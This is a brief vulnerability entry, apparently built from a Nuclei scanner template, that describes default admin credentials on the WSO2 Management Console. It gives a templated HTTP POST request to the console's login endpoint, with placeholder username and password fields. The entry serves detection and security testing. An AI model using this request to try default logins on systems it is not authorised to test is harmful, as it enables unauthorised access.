# Vulnerability: WSO2 Management Console Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`wso2-default-login.yaml`)

## Description
WSO2 Management Console default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /carbon/admin/login_action.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

